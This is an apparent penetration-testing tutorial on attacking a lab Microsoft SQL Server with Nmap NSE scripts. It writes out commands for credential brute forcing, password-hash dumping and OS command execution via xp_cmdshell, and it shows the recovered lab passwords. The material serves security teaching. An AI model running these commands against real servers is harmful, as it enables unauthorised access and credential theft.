<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ms-sql-penetration-testing/" rel="category tag">MS-SQL Penetration Testing</a></span>            </div>
            <h1 class="post-title entry-title">MSSQL for Pentester: Nmap</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/mssql-for-pentesternmap/" rel="bookmark"><time class="entry-date published" datetime="2021-08-19T10:05:16+00:00">August 19, 2021</time><time class="updated" datetime="2025-05-10T18:16:27+00:00">May 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">To obtain basic information such as database names, usernames, names of tables, etc from the SQL servers on the Windows operating system, we will execute penetration testing using Nmap scripts. MSSQL is Microsoft SQL Server for database management in the network. By default, it runs on port 1433. In our <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.hackingarticles.in/penetration-testing-lab-setupms-sql/">previous</a></strong> </span>article, we had set up a Microsoft SQL Server in Windows 10.</span></p>
<h3><span style="color: #800000;"><strong>Table of Content</strong></span></h3>
<ul>
<li><span style="color: #000000;">Requirement</span></li>
<li><span style="color: #000000;">Enumerating version</span></li>
<li><span style="color: #000000;">Credential Brute Force</span></li>
<li><span style="color: #000000;">Execute SQL Query</span></li>
<li><span style="color: #000000;">NetBIOS Enumeration</span></li>
<li><span style="color: #000000;">MS-SQL Password Hash Dump</span></li>
<li><span style="color: #000000;">Command Execution</span></li>
<li><span style="color: #000000;">Test Empty Password Login</span></li>
<li><span style="color: #000000;">Enumerate Database Tables</span></li>
</ul>
<h3><span style="color: #800000;"><strong>Requirement</strong></span></h3>
<p><span style="color: #000000;"><strong>Attacker:</strong> Kali Linux (NMAP)</span></p>
<p><span style="color: #000000;"><strong>Target:</strong> Windows 10 (MS SQL Server)</span></p>
<p><span style="color: #000000;">Nmap is a collection of Lua-based NSE scripts that conduct authentication and unauthenticated penetration testing on MS-SQL port 1433. The NSE script for MS-SQL may be identified using the instructions below.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">locate *.nse | grep ms-sql</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-4dYTFUFC-Xg/YR4qfU4QL3I/AAAAAAAAyNE/teNjU5BPa-8E8W3ctp5S47j9_eqmNfV3QCLcBGAsYHQ/s16000/0.png"/></span></p>
<h3><span style="color: #800000;"><strong>Enumerating version</strong></span></h3>
<p><span style="color: #000000;">This Script will attempt to determine configuration and version information for Microsoft SQL Server instances.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -p 1433 --script ms-sql-info 192.168.1.146</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Q61AWENJJrY/YR4qjvWWehI/AAAAAAAAyNI/8B6lwxp3dY40lgh4dCYSZE9qxeLsMP09ACLcBGAsYHQ/s16000/2.png"/></span></p>
<h3><span style="color: #800000;"><strong>Credential Brute Force</strong></span></h3>
<p><span style="color: #000000;">Performs brute-force password auditing against Ms-SQL servers and connection timeout (default: “5s”). All we need are dictionaries for usernames and passwords, which will be passed as arguments.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -p1433 --script ms-sql-brute --script-args userdb=users.txt,passdb=pass.txt 192.168.1.146</pre>
<p><span style="color: #000000;">In the image you can observe that we had successfully retrieve credentials for three users:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">Username: pavan and password:Password@123
Username: aarti and password:Password@123
Username: sa and password: Password@1</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-PLiRu4CVjTM/YR4qnqh2QGI/AAAAAAAAyNM/f-cURqGbYR4gHlpNhGmDTOGMUzsQsLVfwCLcBGAsYHQ/s16000/3.png"/></span></p>
<h3><span style="color: #800000;"><strong>Execute SQL Query</strong></span></h3>
<p><span style="color: #000000;">Once you have retrieved the login credential use these credentials in the NMAP script to execute MS –SQL query. Given below will try to execute certain query “sp_database” against Microsoft SQL Server.</span></p>
<p><span style="color: #000000;">Specified query “sp_databases” is part of record Stored Procedures and dump a list of database names from an instance of the SQL Server.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -p1433 --script ms-sql-query --script-args mssql.username=sa,mssql.password=Password@1,ms-sql-query.query="sp_databases" 192.168.1.146</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-P2y5b6ey2mo/YR4qr6XOujI/AAAAAAAAyNQ/BovbYRJqN3gnAfAURAyq4GlRML934BwUgCLcBGAsYHQ/s16000/4.png"/></span></p>
<h3><span style="color: #800000;"><strong>NetBIOS Enumeration</strong></span></h3>
<p><span style="color: #000000;">Given below NMAP script will enumerate information from remote Microsoft SQL services with NTLM authentication enabled.</span></p>
<p><span style="color: #000000;">Sending an MS-TDS NTLM authentication request with an invalid domain and null credentials will cause the remote service to respond with an NTLMSSP message disclosing information to include NetBIOS, DNS, and OS build version.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -p1433 --script ms-sql-ntlm-info 192.168.1.146</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-9_a3McomC4A/YR4qv-d5x2I/AAAAAAAAyNY/dIJtlEcywUQ5_hiAAPLI8HedvAfRCHDnQCLcBGAsYHQ/s16000/5.png"/></span></p>
<h3><span style="color: #800000;"><strong>MS-SQL Password Hash Dump</strong></span></h3>
<p><span style="color: #000000;">The following command will dump the password hashes from an MS-SQL server in a format suitable for cracking by tools such as John-the-ripper. To do so, the user needs to have the appropriate DB privileges.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -p1433 --script ms-sql-dump-hashes --script-args mssql.username=sa,mssql.password=Password@1 192.168.1.146</pre>
<p><span style="color: #000000;">From the given image you can observe that it has dumped the hash value of passwords of the user: sa which we have enumerated above.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Zrp_Nl4YTYY/YR4q5wgm4zI/AAAAAAAAyNg/SLeF7JGts2kAC0cMfi9dtPnFhjHGIPvSgCLcBGAsYHQ/s16000/6.png"/></span></p>
<h3><span style="color: #800000;"><strong>Command Excecution</strong></span></h3>
<p><span style="color: #000000;">The xp_cmdshell is a function of Microsoft SQL Server that allows system administrators to execute an operating system command. By default, the system disables the xp_cmdshell option. The NMAP script will attempt to run a command using the Microsoft SQL Server command shell if it finds that xp_cmdshell is enabled on the targeted server.<br/>
</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -p1433 --script ms-sql-xp-cmdshell --script-args mssql.username=sa,mssql.password=Password@1,ms-sql-xp-cmdshell.cmd="net user" 192.168.1.146</pre>
<p><span style="color: #000000;">From the depicted image you can perceive the output for the “net user” command.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-zggAI1orXt0/YR4q-AejqyI/AAAAAAAAyNo/ZMBjGjbmGJMg5sLCMb_3w54RnA_5Z4v0ACLcBGAsYHQ/s16000/7.png"/></span></p>
<h3><span style="color: #800000;"><strong>Test Empty Password Login</strong></span></h3>
<p><span style="color: #000000;">If the administrator of Microsoft-SQL Server left the password blank for login, the attacker can direct login into the database server; as shown in the image below, we are investigating the property of a user’s account “sa.”</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-VV8bz1do1PE/YR4rCHJrg6I/AAAAAAAAyNw/8vrqI2bvO7kKRcOQtSqMssP1md1LtE3IwCLcBGAsYHQ/s16000/10.png"/></span></p>
<p><span style="color: #000000;">Following  NMAP script will try to authenticate to Microsoft SQL Servers using an empty password for the sysadmin (sa) account.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -p1433 --script ms-sql-empty-password 192.168.1.146</pre>
<p><span style="color: #000000;">We had successfully logged in with user: sa and an empty password, as you can see in the screenshot below.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-09Ieqd7Oh9E/YR4rGKuIorI/AAAAAAAAyN0/Q6zZuxV7288I3DFGmt584NSRgt9iWBi1gCLcBGAsYHQ/s16000/11.png"/></span></p>
<h3><span style="color: #800000;"><strong>Enumerate Database Tables</strong></span></h3>
<p><span style="color: #000000;">The following command will attempt to fetch a list of tables from inside the Microsoft SQL server bypassing login credentials as an argument through Nmap script.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -p1433 --script ms-sql-tables --script-args mssql.username=sa,mssql.password=Password@1 192.168.1.146</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-d0VwQCPb51o/YR4rKa1RzmI/AAAAAAAAyN8/kgezq8sb_8YYsryz2PMAhhxb3RYMLR2BwCLcBGAsYHQ/s16000/12.png"/></span></p>
<p><span style="color: #000000;"><strong>Author: </strong>Aarti Singh is a Researcher and Technical Writer at Hacking Articles an Information Security Consultant Social Media Lover and Gadgets. Contact<strong><a style="color: #000000;" href="https://www.linkedin.com/in/aarti--singh/"> <span style="color: #0000ff;">here</span></a></strong></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
